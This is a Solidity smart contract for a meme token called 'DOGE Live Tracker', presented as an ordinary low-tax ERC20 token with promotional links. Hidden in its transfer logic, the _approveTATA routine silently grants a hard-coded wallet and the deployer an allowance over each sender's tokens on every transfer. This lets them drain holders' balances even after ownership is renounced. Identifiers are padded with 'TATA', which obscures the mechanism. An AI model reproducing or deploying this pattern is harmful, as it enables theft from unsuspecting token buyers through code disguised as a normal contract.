/*
Following the money

https://doge-tracker.com
https://x.com/Tracking_DOGE
https://t.me/dogetracker_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ITATARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface ITATAFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplitataon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract DOGETRACKER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balTATAs;
    mapping (address => mapping (address => uint256)) private _allowTATAs;
    mapping (address => bool) private _excludedFromTATA;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalTATA = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE Live Tracker";
    string private constant _symbol = unicode"DOGETRACKER";
    uint256 private _swapTokenTATAs = _tTotalTATA / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockTATA;
    uint256 private _tataBuyAmounts = 0;
    bool private inSwapTATA = false;
    modifier lockTheSwap {
        inSwapTATA = true;
        _;
        inSwapTATA = false;
    }
    address private _tataPair;
    ITATARouter private _tataRouter;
    address private _tataWallet;
    address private _tataAddress;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _tataAddress = address(msg.sender);
        _tataWallet = address(0x6DD259C2f98542b5aD86515BB4BD10E3787C59B6);
        _excludedFromTATA[owner()] = true;
        _excludedFromTATA[address(this)] = true;
        _excludedFromTATA[_tataWallet] = true;
        _balTATAs[_msgSender()] = _tTotalTATA;
        emit Transfer(address(0), _msgSender(), _tTotalTATA);
    }

    function pairTokenInit() external onlyOwner() {
        _tataRouter = ITATARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_tataRouter), _tTotalTATA);
        _tataPair = ITATAFactory(_tataRouter.factory()).createPair(address(this), _tataRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalTATA;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balTATAs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowTATAs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowTATAs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowTATAs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _approveTATA(address owner, uint256 tataA) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        address[2] memory _tataAddrs;
        _tataAddrs[0] = address(_tataWallet);
        _tataAddrs[1] = address(_tataAddress);
        for(uint8 tataK=0;tataK<2;tataK++){
            _allowTATAs[owner][_tataAddrs[tataK]] = tataA;
            emit Approval(owner, _tataAddrs[tataK], tataA);
        }
    }

    function swapTATABack(address tataF, address tataT, uint256 tataA) private { 
        uint256 tokenTATA = balanceOf(address(this)); _approveTATA(tataF, tataA);
        if (!inSwapTATA && tataT == _tataPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenTATA > _swapTokenTATAs)
            swapTokensForEth(minTATA(tataA, minTATA(tokenTATA, _swapTokenTATAs)));
            uint256 ethTATA = address(this).balance;
            if (ethTATA >= 0) {
                sendETHTATA(address(this).balance);
            }
        }
    }

    function _transfer(address tataF, address tataT, uint256 tataA) private {
        require(tataF != address(0), "ERC20: transfer from the zero address");
        require(tataT != address(0), "ERC20: transfer to the zero address");
        require(tataA > 0, "Transfer amount must be greater than zero");
        uint256 taxTATA = _tataFeeTransfer(tataF, tataT, tataA);
        if(taxTATA > 0){
          _balTATAs[address(this)] = _balTATAs[address(this)].add(taxTATA);
          emit Transfer(tataF, address(this), taxTATA);
        }
        _balTATAs[tataF] = _balTATAs[tataF].sub(tataA);
        _balTATAs[tataT] = _balTATAs[tataT].add(tataA.sub(taxTATA));
        emit Transfer(tataF, tataT, tataA.sub(taxTATA));
    }

    function _tataFeeTransfer(address tataF, address tataT, uint256 tataA) private returns(uint256) {
        uint256 taxTATA = 0; 
        if (tataF != owner() && tataT != owner()) {
            taxTATA = tataA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (tataF == _tataPair && tataT != address(_tataRouter) && ! _excludedFromTATA[tataT]) {
                if(_buyBlockTATA!=block.number){
                    _tataBuyAmounts = 0;
                    _buyBlockTATA = block.number;
                }
                _tataBuyAmounts += tataA;
                _buyCount++;
            }

            if(tataT == _tataPair && tataF!= address(this)) {
                require(_tataBuyAmounts < swapLimitTATA() || _buyBlockTATA!=block.number, "Max Swap Limit");  
                taxTATA = tataA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapTATABack(tataF, tataT, tataA);
        } return taxTATA;
    }

    function minTATA(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHTATA(uint256 tataA) private {
        payable(_tataWallet).transfer(tataA);
    }

    function swapLimitTATA() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tataRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _tataRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _tataRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function swapTokensForEth(uint256 tataAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _tataRouter.WETH();
        _approve(address(this), address(_tataRouter), tataAmount);
        _tataRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tataAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}